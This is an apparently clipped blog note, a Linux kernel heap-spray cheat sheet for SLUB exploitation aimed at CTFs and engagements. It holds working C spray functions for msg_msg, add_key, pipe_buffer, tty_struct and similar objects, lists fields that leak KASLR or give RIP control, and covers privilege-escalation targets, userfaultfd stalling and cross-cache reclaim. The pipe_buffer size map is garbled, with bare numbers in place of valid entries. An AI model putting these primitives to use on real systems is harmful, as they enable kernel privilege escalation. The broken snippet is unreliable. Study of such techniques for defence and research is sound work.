---
title: Linux kernel heap spray cheat sheet | kiperZ
source: https://kiperz.dev/notes/kernel-heap-spray-cheatsheet/
source_host: kiperz.dev
clip_date: 2026-10-08T00:09:07+08:00
trace_id: b4298ced-b0f8-49a8-abb2-32becbebbcde
content_hash: a3e6ad6938038d552c01b545c29dfb215162195af141ff68db1bffa4cc79a8ce
status: synced
tags:
  - 内核
  - 漏洞分析
series: null
feed_source: kiperZ·Android/内核
ai_summary: 一张按 kmalloc 缓存尺寸索引的 Linux 内核堆喷射速查表：标明每个可喷射对象落在哪个 cache、是 plain 还是 cg、字节是否可控、哪个字段泄漏地址或可达 RIP。
ai_summary_style: key-points
images_status:
  total: 0
  succeeded: 0
  failed_urls: []
notion_page_id: 3f275244-d011-8145-a30a-d92cb3b8f78d
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> 一张按 kmalloc 缓存尺寸索引的 Linux 内核堆喷射速查表：标明每个可喷射对象落在哪个 cache、是 plain 还是 cg、字节是否可控、哪个字段泄漏地址或可达 RIP。
> 
> - **缓存布局：** x86-64 SLUB 尺寸为 8/16/32/64/96/128/192/256/512/1024/2048/4096/8192，超过 8192 直接走 page allocator；`kmalloc-cg-*`（5.14+ 拆分）承载 `GFP_KERNEL_ACCOUNT` 对象，`kmalloc-rnd-NN-*`（6.6+）是每个尺寸 16 份随机副本。
> - **flag 必须匹配：** cg 与 plain 同尺寸对象位于不同 cache、永不重叠，错配会静默失败。cg 喷射有 msg_msg（6.10 前）、simple_xattr、pipe_buffer；plain 有 add_key、sk_buff、setxattr、anon_vma_name、sendmsg、poll_list。
> - **泄漏与 RIP 点：** `seq_operations->start`（cg-32）、`tty_struct->ops`（cg-1024，ptm_unix98_ops）、`timerfd_ctx->t.tmr.function`（256）、`shm_file_data->vm_ops`（plain-32）；pipe_buffer 写入 1 字节后 `->ops = &anon_pipe_buf_ops` 即可破 KASLR，关闭时经 `->ops->release` 触达 RIP。
> - **版本敏感：** 6.2+ 起 skb 头 ≤ 约 704 字节走专用 `skb_small_head_cache`，故 sk_buff 只在 kmalloc-1024 及以上命中通用 cache；6.11+ 起 msg_msg 与 setxattr 分别改走专用 kmem_buckets、`user_buckets`，不再与通用 cache 碰撞。
> - **专用 cache 与流程：** cred（cred_jar）、file（filp）、msg_msg 等需 cross-cache（空洞页归还 buddy 后再用另一 cache 抢占）；喷射顺序为 defrag → 填满 partial slab → 释放一个洞 → 触发 victim → 回收；瞬态对象用 userfaultfd 或 FUSE 挂起，RANDOM_KMALLOC_CACHES 只能从同一调用点喷射绕过。

A reference card for picking spray objects during SLUB exploitation: which kernel object lands in which `kmalloc` cache, whether it is plain or memcg-accounted, whether you control its bytes, and which field leaks an address or reaches RIP. It is built for use under time pressure during a CTF or an engagement, so it leans on tables and short snippets rather than prose. Every size, flag, symbol, and version threshold was checked against the source; where a fact depends on the kernel version, the sheet says so instead of giving one absolute number.

> x86-64, SLUB. Reference source is Linux v6.12; version-sensitive facts are flagged inline. Sizes, GFP flags and cache placement drift between versions, so confirm the alloc site in your target’s source before relying on a number here.

Prelude once. Elastic functions (`spray_msg_msg`, `spray_add_key`, …) are defined in section 2; section 1 calls them.

```c
#define _GNU_SOURCE          /* MSG_COPY, CMSG_* , F_SETPIPE_SZ */
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <poll.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/shm.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <sys/xattr.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/ioctl.h>
#include <sys/timerfd.h>
#include <linux/userfaultfd.h>

#ifndef KEY_SPEC_PROCESS_KEYRING
#define KEY_SPEC_PROCESS_KEYRING -2
#endif

#ifndef PR_SET_VMA
#define PR_SET_VMA           0x53564d41
#define PR_SET_VMA_ANON_NAME 0
#endif

struct msgbuf_x {
    long mtype;
    char mtext[0];
};
```

Caches on x86-64: `8 16 32 64 96 128 192 256 512 1024 2048 4096 8192`. `kmalloc(n)` rounds up to the next bucket. 8192 is `KMALLOC_MAX_CACHE_SIZE`; a request above it skips the slab caches and goes straight to the page allocator (`kmalloc_large`). The accounted copies `kmalloc-cg-*` hold `GFP_KERNEL_ACCOUNT` objects (split out in 5.14), and `kmalloc-rnd-NN-*` are the 16 randomized copies per size (6.6+, section 6). Objects in a dedicated or segregated cache (`cred_jar`, `filp`, the `msg_msg` and `user_buckets` kmem_buckets from 6.11) never share a generic cache, so reach them with cross-cache (section 7).

### Legend

-   **plain**: allocated with `GFP_KERNEL`, lands in `kmalloc-*`. Most victims live here.
-   **cg**: allocated with `GFP_KERNEL_ACCOUNT`, lands in the separate `kmalloc-cg-*` caches (5.14+). A cg object and a plain object of the same size sit in different caches and never overlap, so your spray must match the victim’s flag. A mismatch fails silently: the objects land in the wrong cache and never neighbour the victim.
-   **ctrl**: you control the bytes written into the object.
-   **size only**: you control the allocation size (which cache) but not the bytes. Good for layout and cross-cache, useless for forging a fake object.
-   **fp**: carries function pointers, useful for RIP control.
-   **leak**: fields disclose kernel or heap addresses.
-   **persistent / transient**: stays allocated until you free it, vs. freed inside the syscall (hold it with section 5).

* * *

## 1\. Spray by cache size

Each cache lists its distinct sprays, tagged with the legend above. Where a cache has both a plain and a cg zone, they are separated, because a 5.14+ victim only collides with sprays carrying its own flag.

### kmalloc-32

Plain zone. Controlled content: `spray_add_key(32, n, data)`, and `spray_anon_vma_name(n, name)` for a name of up to 27 bytes (header is 4, so 4 + 28 lands in 32). Victim `shm_file_data` sits here too: it leaks `init_ipc_ns` (only when the task is in the initial IPC namespace), the underlying `shmem_vm_ops` (kernel text or rodata), and a heap pointer to the internal shmem file.

cg zone. `seq_operations` is allocated by `single_open` with `GFP_KERNEL_ACCOUNT`, so it lives in `kmalloc-cg-32`, not the plain cache. It gives both an fp (`->start`, set to `single_start`) and a KASLR leak through `->start/->next/->stop` (single_start, single_next, single_stop in fs/seq_file.c). Opening any `ONE()` procfs file triggers the alloc; `/proc/self/stat` is the usual one.

```c
void spray_seq_operations(int *fds, int n)   /* cg-32 */
{
    for (int i = 0; i < n; i++) {
        fds[i] = open("/proc/self/stat", O_RDONLY);
    }
}

void spray_shm_file_data(void **addrs, int n) /* plain-32 */
{
    for (int i = 0; i < n; i++) {
        int id = shmget(IPC_PRIVATE, 0x1000, IPC_CREAT | 0600);
        addrs[i] = shmat(id, NULL, 0);
    }
}
```

Both sprays are fd or mapping backed, so raise `RLIMIT_NOFILE` (and mind `SHMMNI`, default 4096) before spraying in the thousands.

### kmalloc-64

Plain: `spray_add_key(64, n, data)`, `spray_anon_vma_name(n, name)` with a name of 28..60 bytes. cg: `spray_msg_msg(64, n, data)` (floor of msg_msg, the 48-byte header leaves a 16-byte body).

### kmalloc-96

Plain victim `subprocess_info` (fp `->cleanup`, 96 bytes) comes from a socket with an unregistered protocol, which triggers `request_module` through `call_usermodehelper` (GFP_KERNEL). Noisy and racy. Controlled content: `spray_add_key(96, n, data)`, `spray_anon_vma_name(n, name)` with a 61..80-byte name (4 + up to 84 rounds to 96). cg: `spray_msg_msg(96, n, data)`.

### kmalloc-128

Noisy cache, hundreds of active slabs on an idle system. Defrag first and spray thousands. Plain: `spray_add_key(128, ...)`. cg: `spray_msg_msg(128, ...)`.

### kmalloc-192

`spray_msg_msg(192, n, data)` (cg) and `spray_pipe_buffer(192, n, fds)` (cg, layout plus a `->ops` leak once written; a 192 pipe is 4 slots of 40 bytes, so 160 bytes rounding to this cache). `cred` is a priv target but lives in `cred_jar`, so reach it via cross-cache (section 7).

```c
void spray_cred(int n)
{
    for (int i = 0; i < n; i++) {
        if (fork() == 0) {
            pause();
            _exit(0);
        }
    }
}
```

### kmalloc-256

Controlled content: `spray_msg_msg(256, n, data)` (cg), `spray_add_key(256, n, data)` (plain). Plain victim `timerfd_ctx` (about 216 bytes, GFP_KERNEL) gives an fp through `->t.tmr.function` (timerfd_tmrproc) and a per-cpu leak through `->t.tmr.base` (into `hrtimer_bases`). `struct file` is a classic 256-ish target but it is not in kmalloc-256: it has its own `filp` cache (see section 3), so reach `->f_op` through cross-cache.

```c
void spray_timerfd(int *fds, int n)
{
    for (int i = 0; i < n; i++) {
        fds[i] = timerfd_create(CLOCK_MONOTONIC, 0);
    }
}
```

### kmalloc-512

Controlled content, plain: `spray_add_key(512, ...)`, `spray_setxattr(path, 512, ...)` (transient), and `spray_sk_buff(512, ...)` only on kernels before 6.2 (see the caveat below). Controlled content, cg: `spray_msg_msg(512, ...)` and `spray_simple_xattr(512, ...)` (persistent). Layout and leak, cg: `spray_pipe_buffer(512, n, pipes)`.

```c
int q = spray_msg_msg(512, n, data);         /* cg */
spray_add_key(512, n, data);                 /* plain */
spray_simple_xattr(512, n, data);            /* cg, persistent */
spray_pipe_buffer(512, n, pipes);            /* cg, leaks ->ops once written */

int sv[2];
spray_sk_buff(512, n, data, sv);             /* plain, pre-6.2 only */
```

What leaks here. msg_msg and the add_key payload read their own body back (`MSG_COPY`, `KEYCTL_READ`), so against an out-of-bounds read the neighbour’s bytes come back verbatim, but note the flag mismatch: msg_msg is cg and add_key is plain, so they neighbour different victims. None of the controlled-content sprays carries a kernel pointer of its own, so none beats KASLR alone. pipe_buffer does: resize to 8 pages (`spray_pipe_buffer(512)` sets 32768, giving 8 slots of 40 = 320 bytes, so kmalloc-cg-512), write one byte into the pipe, and every entry then holds `->ops = &anon_pipe_buf_ops` at +0x10 (kernel text, subtract the symbol offset for the base) and `->page` at +0x00 (a `struct page *` in vmemmap). That is the KASLR source in this cache, and it is cg.

sk_buff caveat. Since 6.2 a skb head up to `SKB_SMALL_HEAD_CACHE_SIZE` (about 704 bytes, derived from `MAX_TCP_HEADER`) is served from the dedicated `skb_small_head_cache`, not from `kmalloc-*`. The `cache - 320` body formula therefore only reaches a generic cache for `kmalloc-1024` and above on 6.2+; for `kmalloc-512` it lands in the small-head cache instead. TODO: confirm the exact `SKB_SMALL_HEAD_CACHE_SIZE` on your target (it tracks `MAX_TCP_HEADER` and `CONFIG_MAX_SKB_FRAGS`) before counting on the 512 or 1024 boundary.

### kmalloc-1024

cg: `spray_msg_msg(1024, ...)` and the default pipe_buffer ring (16 slots of 40 = 640 bytes, `spray_pipe_buffer(1024, ...)`), whose `->ops->release` reaches RIP when the pipe closes. Plain: `spray_sk_buff(1024, ...)` (reaches the generic cache on 6.2+, being above the small-head threshold). Victim `tty_struct` (about 700 bytes) is allocated by `alloc_tty_struct` with `GFP_KERNEL_ACCOUNT`, so it is `kmalloc-cg-1024`, not plain. Its `->ops` points to `ptm_unix98_ops` for a `/dev/ptmx` master (the slave peer at `->link->ops` is `pty_unix98_ops`); it also carries self and device back-pointers (heap).

```c
void spray_tty_struct(int *fds, int n)   /* cg-1024 */
{
    for (int i = 0; i < n; i++) {
        fds[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY);
    }
}
```

### kmalloc-2048 and kmalloc-4096

Victims up here: `n_tty_data` (pty line discipline, cg), driver buffers. Controlled content, plain: `spray_add_key(4096, ...)`, `spray_setxattr(path, 4096, ...)`, `spray_sk_buff(4096, ...)`. cg: `spray_msg_msg(4096, ...)`, `spray_simple_xattr(4096, ...)`, `spray_pipe_buffer(2048|4096, ...)`.

```c
spray_msg_msg(4096, n, data);        /* cg */
spray_add_key(4096, n, data);        /* plain */

int sv[2];
spray_sk_buff(4096, n, data, sv);    /* plain */

spray_simple_xattr(4096, n, data);   /* cg */
```

### kmalloc-8192 and above

```c
spray_add_key(16384, n, data);     /* plain, body caps at 32767 */
spray_msg_msgseg(1024, n, data);   /* 4096-byte msg_msg body + a chosen seg cache */
```

A request above 8192 leaves the slab caches, so `setxattr` and friends fall into the page allocator there.

* * *

## 2\. Elastic objects (one function, any size)

`spray_*(cache, n, data)` takes the cache size and subtracts its own header. Shared params:

-   `cache`: target kmalloc cache in bytes (512, 1024, …). The function computes the body length as `cache - header`.
-   `n`: how many objects to spray.
-   `data`: source buffer copied into each object body. It must hold at least `cache - header` bytes, so the safe move is to pass a buffer of `cache` bytes. A shorter buffer reads out of bounds in userspace.

Each meta line reads: cache zone, header, lifetime, content control, range.

### msg_msg

cg (5.14..6.10), dedicated `msg_msg` kmem_buckets (6.11+) | header 0x30 | persistent | ctrl | 64..4096+

The 48-byte header is `sizeof(struct msg_msg)`. From 5.14 to 6.10 the body is `kmalloc(..., GFP_KERNEL_ACCOUNT)`, so `kmalloc-cg-*`. From 6.11 the main body moves to a dedicated `kmem_buckets` cache named `msg_msg` (created `SLAB_ACCOUNT`, allocated `GFP_KERNEL`), which no longer collides with generic `kmalloc-cg-*`; only the chained `msg_msgseg` segments stay `GFP_KERNEL_ACCOUNT`. `spray_msg_msgseg` handles a body over 4048 by chaining a `msg_msgseg` (header 8) into a second cache. `leak_msg_msg` copies a message back without removing it, and needs `CONFIG_CHECKPOINT_RESTORE` for `MSG_COPY`.

```c
int spray_msg_msg(size_t cache, int n, const void *data)
{
    int q = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
    size_t body = cache - 48;
    struct msgbuf_x *m = calloc(1, sizeof(long) + body);

    /* One queue blocks once it holds msg_qbytes bytes (MSGMNB, default
       16384). Raise the limit so n large messages fit; needs
       CAP_SYS_RESOURCE to exceed MSGMNB, otherwise spread across queues. */
    struct msqid_ds ds;
    msgctl(q, IPC_STAT, &ds);
    ds.msg_qbytes = (unsigned long)(body + 64) * n;
    msgctl(q, IPC_SET, &ds);

    m->mtype = 1;
    memcpy(m->mtext, data, body);
    for (int i = 0; i < n; i++) {
        msgsnd(q, m, body, 0);
    }

    free(m);
    return q;
}

int spray_msg_msgseg(size_t seg_cache, int n, const void *seg_data)
{
    int q = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
    size_t body = 4048 + (seg_cache - 8);
    struct msgbuf_x *m = calloc(1, sizeof(long) + body);
    struct msqid_ds ds;

    msgctl(q, IPC_STAT, &ds);
    ds.msg_qbytes = (unsigned long)(body + 64) * n;
    msgctl(q, IPC_SET, &ds);

    m->mtype = 1;
    memcpy(m->mtext + 4048, seg_data, seg_cache - 8);
    for (int i = 0; i < n; i++) {
        msgsnd(q, m, body, 0);
    }

    free(m);
    return q;
}

void leak_msg_msg(int q, void *out, size_t body)
{
    struct msgbuf_x *m = malloc(sizeof(long) + body);

    msgrcv(q, m, body, 0, MSG_COPY | IPC_NOWAIT);
    memcpy(out, m->mtext, body);
    free(m);
}
```

Params: `data` must hold `cache - 48` bytes. `spray_msg_msgseg(seg_cache, n, seg_data)` places `seg_data` (needs `seg_cache - 8` bytes) into the chained segment. `leak_msg_msg(q, out, body)` writes `body` bytes into `out`. Floor is 64 (48-byte header leaves a 16-byte body). Free with `msgctl(q, IPC_RMID, NULL)`. A single `msgsnd` is also capped at `MSGMAX` (`/proc/sys/kernel/msgmax`, default 8192 bytes), so the multi-segment path needs that raised before a body over 8192 will send.

### add_key (user_key_payload)

plain kmalloc | header 0x18 | persistent | ctrl | 32..32791

Stays in `kmalloc-*`, so it survives the cg split. The 24-byte header is `sizeof(struct user_key_payload)` (rcu_head 16, datalen 2, pad to u64). The `user` / `logon` type caps `datalen` at 32767, so the largest object is 24 + 32767 and still lands in the page allocator above 8192. Read with `KEYCTL_READ`, free with `KEYCTL_REVOKE` or `KEYCTL_UNLINK` (the slab free is RCU-deferred).

```c
void spray_add_key(size_t cache, int n, const void *data)
{
    char desc[32];

    for (int i = 0; i < n; i++) {
        sprintf(desc, "spray_%zu_%d", cache, i);
        syscall(SYS_add_key, "user", desc, data, cache - 24,
                KEY_SPEC_PROCESS_KEYRING);
    }
}
```

Params: `data` must hold `cache - 24` bytes. The description is generated internally, one unique key per index. Quota: an unprivileged user is capped by `/proc/sys/kernel/keys/maxkeys` (200) and `maxbytes` (20000), so a large spray needs root (`root_maxkeys` 1000000, `root_maxbytes` 25000000) or a raised quota.

### sk_buff (head)

plain kmalloc or `skb_small_head_cache` | tail 320, rounds to 64 | persistent | ctrl (leading bytes) | see caveat

`skb_shared_info` is 320 bytes (0x140) with the default `CONFIG_MAX_SKB_FRAGS=17`, so the data buffer is `round_up_64(len) + 320`. The send path uses `GFP_KERNEL` with no `__GFP_ACCOUNT`, so the buffer is plain. Caveat: since 6.2 a head up to `SKB_SMALL_HEAD_CACHE_SIZE` (about 704 bytes) comes from the dedicated `skb_small_head_cache`; only larger heads reach the generic `kmalloc-*` caches. So the floor for a generic-cache spray is effectively `kmalloc-1024` on 6.2+, and the whole function targets `kmalloc-512` only on older kernels.

```c
void spray_sk_buff(size_t cache, int n, const void *data, int sv[2])
{
    size_t len = cache - 320;

    socketpair(AF_UNIX, SOCK_DGRAM, 0, sv);
    for (int i = 0; i < n; i++) {
        send(sv[0], data, len, 0);
    }
}
```

Params: `data` must hold `cache - 320` bytes. `sv` is an out param, a caller `int sv[2]` that receives the socketpair so you can close it to free. Volume is bounded by the socket buffer limits (`SO_SNDBUF`, `wmem`).

### setxattr

plain kmalloc or `user_buckets` | header 0 | transient | ctrl | up to 65536

The value is copied through `vmemdup_user`, i.e. `GFP_USER` (plain, unaccounted). From 6.11 `vmemdup_user` routes through the dedicated `user_buckets` kvmalloc buckets, so on 6.11+ it no longer shares generic `kmalloc-*`; before that it is a plain `kvmalloc`. Freed inside the syscall, hold it with uffd or FUSE (section 5). Params: `path` is any existing file, `data` must hold `cache` bytes (no header). `XATTR_SIZE_MAX` is 65536.

```c
void spray_setxattr(const char *path, size_t cache, int n, const void *data)
{
    for (int i = 0; i < n; i++) {
        setxattr(path, "user.x", data, cache, 0);
    }
}
```

### simple_xattr (tmpfs)

cg kmalloc | header 40 (rb_node, 6.2+) or 32 (list_head, pre-6.2) | persistent | ctrl

Persistent alternative to setxattr. The allocation is `kvmalloc(len, GFP_KERNEL_ACCOUNT)`, so it is cg, not plain (unlike setxattr). The header is `sizeof(struct simple_xattr)`: 40 since 6.2 (the tree switched from `list_head` to `rb_node`), 32 before. `user.*` xattrs on tmpfs only exist from 6.6, so `/dev/shm` fails with `EOPNOTSUPP` on older kernels; use an on-disk fs there. Free by closing the fd and unlinking the file.

```c
int spray_simple_xattr(size_t cache, int n, const void *data)
{
    int fd = open("/dev/shm/spray", O_CREAT | O_RDWR, 0600);
    char name[32];

    for (int i = 0; i < n; i++) {
        sprintf(name, "user.x%d", i);
        fsetxattr(fd, name, data, cache - 40, 0);
    }

    return fd;
}
```

Params: `data` must hold `cache - 40` bytes (verify the header per version).

### sendmsg (ancillary data)

plain kmalloc | header 0 | transient | ctrl | bounded by optmem_max

When `msg_controllen` exceeds the small on-stack buffer (about 64 bytes), the kernel copies the control blob into `sock_kmalloc(sk, ctl_len, GFP_KERNEL)`, a plain allocation sized `round_up(ctl_len)`. The copy happens before the cmsg is parsed, so a zeroed buffer still produces the allocation; it is freed at the end of the syscall, so treat it as transient and hold it with section 5. Params: `fd` is a socket, `control_len` the controlled payload size, `n` the count. Total is bounded by `/proc/sys/net/core/optmem_max` (default 20480 or 65536).

```c
void spray_sendmsg(int fd, size_t control_len, int n)
{
    char *cbuf = calloc(1, CMSG_SPACE(control_len));
    struct msghdr msg = {0};

    msg.msg_control = cbuf;
    msg.msg_controllen = CMSG_SPACE(control_len);
    for (int i = 0; i < n; i++) {
        sendmsg(fd, &msg, 0);
    }

    free(cbuf);
}
```

### prctl anon_vma_name

plain kmalloc | header 4 (kref) | persistent | ctrl (printable ASCII, NUL-terminated) | kmalloc-32/64/96 (5.17+)

One of the few elastic objects that lands in the plain small caches rather than cg. `anon_vma_name_alloc` is `kmalloc(..., GFP_KERNEL)`, so plain. The object is `struct kref` (4 bytes) followed by the name, `ANON_VMA_NAME_MAX_LEN` is 80, so the total is 4 + up to 80 and spans kmalloc-32/64/96. Content is constrained: the name is a NUL-terminated printable-ASCII string (control and a few punctuation bytes are rejected), so it suits layout and partial content, not forging arbitrary 8-byte pointers. Introduced in 5.17.

```c
void spray_anon_vma_name(int n, const char *name)
{
    for (int i = 0; i < n; i++) {
        char *page = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                          MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        prctl(PR_SET_VMA, PR_SET_VMA_ANON_NAME,
              (unsigned long)page, 0x1000, name);
    }
}
```

Params: `name` is a NUL-terminated string up to 80 bytes; the object size is `4 + strlen(name) + 1`.

### poll_list

plain kmalloc | transient | size only | held for the timeout

`do_sys_poll` allocates `struct poll_list` chunks with `GFP_KERNEL`. Params: `n_fds` sets the size (`n_fds * sizeof(struct pollfd)` plus a small header), `timeout_ms` is how long the allocation is held (the chunk lives for the duration of the `poll` call).

```c
void spray_poll_list(size_t n_fds, int timeout_ms)
{
    struct pollfd *pfds = calloc(n_fds, sizeof(*pfds));

    for (size_t i = 0; i < n_fds; i++) {
        pfds[i].fd = -1;
    }

    poll(pfds, n_fds, timeout_ms);
    free(pfds);
}
```

### pipe_buffer array

cg kmalloc | entry 40, slots round to a power-of-two page count | persistent | size only (body), leak + fp via `->ops`

Both `pipe_inode_info` and the `bufs` array are `GFP_KERNEL_ACCOUNT`, so cg. The body is size-only, but the kernel fills two useful fields per entry once the pipe carries data. `->ops` at +0x10 points to `&anon_pipe_buf_ops`, a const in kernel text, so one entry defeats KASLR; the same field reaches RIP through `->ops->release` when the pipe is closed, usually set up cross-cache (section 7). `->page` at +0x00 is a `struct page *` in vmemmap, good for a physmap bearing. Write at least one byte before you read, or the slots come back zeroed. Entry i sits at `i * 0x28`. `F_SETPIPE_SZ` rounds the byte size up to a power-of-two page count, one 40-byte slot per page: 4 pages (160 bytes) in kmalloc-cg-192, 8 pages in kmalloc-cg-512, 16 pages (the default) in kmalloc-cg-1024, 32 pages in kmalloc-cg-2048.

Params: `cache` picks the cache (one of 192, 512, 1024, 2048, 4096, 8192), `n` is how many pipes to spray, `fds` is an out param `int fds[n][2]` that receives each pipe’s two ends so you can write, read, close, or trigger later. The one-byte `write` is what sets `->ops`; drop it and the array stays zeroed. Free by closing both ends of every pair.

```c
void spray_pipe_buffer(size_t cache, int n, int fds[][2])
{
    static const struct {
        size_t cache;
        size_t bytes;
    } map[] = {
16384
32768
65536
131072
262144
524288
    };
    size_t bytes = 0;

    for (size_t i = 0; i < sizeof(map) / sizeof(map[0]); i++)
        if (map[i].cache == cache) {
            bytes = map[i].bytes;
            break;
        }

    for (int i = 0; i < n; i++) {
        if (pipe(fds[i]) < 0)
            continue;
        fcntl(fds[i][1], F_SETPIPE_SZ, bytes);
        write(fds[i][1], "A", 1);
    }
}
```

Setup. The caller owns the backing array, so declare it before spraying, and resolve the leak offset once per target (`anon_pipe_buf_ops` against the kernel base, for example `nm vmlinux | grep anon_pipe_buf_ops` minus `_text`):

```c
#define N_PIPES 256
#define ANON_PIPE_BUF_OPS 0x1420d40   /* per-target: anon_pipe_buf_ops - _text */

int pipes[N_PIPES][2];
```

Cleanup. The arrays are persistent, so they stay until you close both ends of every pair. Closing is also the trigger for `->ops->release`, so close deliberately once the layout is spent, not in the middle of the groom:

```c
void close_pipe_buffer(int n, int fds[][2])
{
    for (int i = 0; i < n; i++) {
        close(fds[i][0]);
        close(fds[i][1]);
    }
}
```

### dispatcher

Prefers add_key (plain) so it survives the cg split.

```c
void spray_cache(size_t cache, int n, const void *data)
{
    if (cache <= 32768) {
        spray_add_key(cache, n, data);
    } else {
        spray_msg_msgseg(cache - 4096, n, data);
    }
}
```

### zone and header reference

| Function | Zone | Header | Lifetime | Content | Buffer required |
| --- | --- | --- | --- | --- | --- |
| `spray_msg_msg` | cg (6.11+ `msg_msg` buckets) | 48  | persistent | full | `data` >= `cache - 48` |
| `spray_msg_msgseg` | seg is cg | 8 (seg) | persistent | full | `seg_data` >= `seg_cache - 8` |
| `spray_add_key` | plain | 24  | persistent | full | `data` >= `cache - 24` |
| `spray_sk_buff` | plain (or `skb_small_head_cache`) | 320 tail | persistent | leading bytes | `data` >= `cache - 320` |
| `spray_setxattr` | plain (6.11+ `user_buckets`) | 0   | transient | full | `data` >= `cache` |
| `spray_simple_xattr` | cg  | 40 / 32 | persistent | full | `data` >= `cache - 40` |
| `spray_sendmsg` | plain | 0   | transient | full | n/a (`control_len`) |
| `spray_anon_vma_name` | plain | 4   | persistent | printable, NUL-term | n/a (`name` <= 80) |
| `spray_poll_list` | plain | ~16 | transient | size only | n/a (`n_fds`) |
| `spray_pipe_buffer` | cg  | per entry 40 | persistent | size only + `->ops` | n/a (`cache`, `fds`) |

### size matrix

Pass the cache size directly. `n/a` = unreachable.

| Cache | msg_msg (cg) | add_key (plain) | anon_vma_name (plain) | sk_buff (plain) | simple_xattr (cg) | pipe_buffer (cg) |
| --- | --- | --- | --- | --- | --- | --- |
| 32  | n/a | 32  | 32  | n/a | n/a | n/a |
| 64  | 64  | 64  | 64  | n/a | n/a | n/a |
| 96  | 96  | 96  | 96  | n/a | n/a | n/a |
| 128 | 128 | 128 | n/a | n/a | 128 | n/a |
| 192 | 192 | 192 | n/a | n/a | 192 | 192 |
| 256 | 256 | 256 | n/a | n/a | 256 | n/a |
| 512 | 512 | 512 | n/a | pre-6.2 only | 512 | 512 |
| 1024 | 1024 | 1024 | n/a | 1024 | 1024 | 1024 |
| 4096 | 4096 | 4096 | n/a | 4096 | 4096 | 4096 |
| 8192+ | seg | up to 32767 body | n/a | 8192+ | kvmalloc | 8192 |

Plain sprays (survive the cg split): add_key, sk_buff, setxattr, anon_vma_name, sendmsg, poll_list. cg sprays: msg_msg (through 6.10), simple_xattr, pipe_buffer.

* * *

## 3\. Target index

-   RIP: `seq_operations->start` (cg-32), `tty_struct->ops` (cg-1024), `timerfd_ctx->t.tmr.function` (256), `pipe_buffer->ops->release` (cg, cross-cache), `subprocess_info->cleanup` (96), `file->f_op` (filp, cross-cache).
-   Leak, kernel text or rodata (KASLR). Each field points into text or a const ops table, so subtract the symbol offset for the base:
    -   `seq_operations->start/next/stop` (cg-32): single_start, single_next, single_stop in fs/seq_file.c.
    -   `shm_file_data->vm_ops` (plain-32): the underlying file’s vm_ops, i.e. shmem_vm_ops (not shm_vm_ops, which goes into the VMA rather than into sfd).
    -   `timerfd_ctx->t.tmr.function` (256): timerfd_tmrproc.
    -   `file->f_op` (filp): the device’s file_operations.
    -   `tty_struct->ops` (cg-1024): ptm_unix98_ops for a /dev/ptmx master, pty_unix98_ops for the slave peer at `->link->ops`.
    -   `pipe_buffer->ops` (cg 192/512/1024, after a write): anon_pipe_buf_ops.
-   Leak, heap or page:
    -   `shm_file_data->ns` is init_ipc_ns (kernel data) only in the initial IPC namespace, otherwise a heap `ipc_namespace`; `->file` is a heap address.
    -   `timerfd_ctx->t.tmr.base` is a per-cpu `hrtimer_clock_base` inside `hrtimer_bases`.
    -   `tty_struct` carries self and dev back-pointers (heap).
    -   `pipe_buffer->page` is a vmemmap `struct page *`.
    -   `msg_msg->m_list.next/prev` point at the queue head or the next message (heap).
-   Leak, verbatim read-back: msg_msg (`MSG_COPY`, cg) and user_key_payload (`KEYCTL_READ`, plain) hand their own body back, so when they neighbour an out-of-bounds read the leaked bytes come straight to userland with no pointer of their own. Mind the flag: the cg one and the plain one sit next to different victims.
-   Dedicated caches (reach via cross-cache, section 7): `cred` in `cred_jar`, `struct file` in `filp` (`SLAB_ACCOUNT`, and `SLAB_TYPESAFE_BY_RCU` from 6.12, sizeof about 192 in 6.12 and 232 in 6.6), the `msg_msg` and `user_buckets` kmem_buckets (6.11+).
-   No-RIP privesc: `cred->uid/gid` (ret2cred), pipe and page cache (Dirty Pipe), `modprobe_path` or `core_pattern` overwrite.

## 4\. Measure

```bash
sudo cat /proc/slabinfo | grep -E 'kmalloc-(cg-)?(32|96|128|256|1024) '
sudo slabtop -s c
ls /sys/kernel/slab/ | grep -E 'kmalloc|filp|cred'
```

Order: defrag (alloc and free) -> fill the partial slab -> free one hole -> trigger victim -> reclaim. Spray above the active-slab count; kmalloc-128 can need thousands. Many of the object sprays are fd or mapping backed (seq_operations, timerfd, tty, pipe_buffer, shm), so raise `RLIMIT_NOFILE` first.

## 5\. Hold transient objects

Make `copy_from_user` fault on the second page and stall the handler.

```c
int uffd_setup(void)
{
    int uf = syscall(SYS_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    struct uffdio_api api = { .api = UFFD_API };

    ioctl(uf, UFFDIO_API, &api);
    return uf;
}
```

Register two pages with `UFFDIO_REGISTER_MODE_MISSING`, straddle the boundary with the spray buffer, and have a thread sleep before `UFFDIO_COPY`. Caveat: `vm.unprivileged_userfaultfd` defaults to 0 since 5.11, which restricts an unprivileged process to `UFFD_USER_MODE_ONLY` (user-space faults only); faulting on a kernel `copy_from_user` then needs `CAP_SYS_PTRACE`. When userfaultfd is unavailable, a FUSE filesystem stalls the kernel fault the same way without that sysctl.

## 6\. RANDOM_KMALLOC_CACHES (6.6+)

-   16 copies per size (`kmalloc-rnd-01-*` through `kmalloc-rnd-15-*` plus the base). The bucket is chosen by hashing the `kmalloc` call-site address against a per-boot seed, fixed for the life of the boot.
-   Brute-force re-spraying does not help: the same call site always hits the same bucket.
-   Fix: spray from the same call site as the bug (same subsystem or function). A shared wrapper hashes to the wrapper, so objects funnelled through one wrapper (for example `sock_kmalloc`) still land together, which is a known weak point.
-   Dedicated caches and the kmem_buckets (`msg_msg`, `user_buckets`, 6.11+) are immune to this but also unreachable by generic spray, hence cross-cache.

## 7\. Cross-cache

1.  Groom the victim cache so the vulnerable object sits on a slab you control, then free every object on that slab.
2.  Force the now-empty slab page back to the buddy allocator. SLUB does not release it on the last free: it parks empty slabs on the per-cpu and per-node partial lists, so you must also overflow those lists (allocate enough other slabs to evict the target) before the page returns.
3.  Immediately allocate from a different cache so it pulls a fresh page and reclaims that physical page.
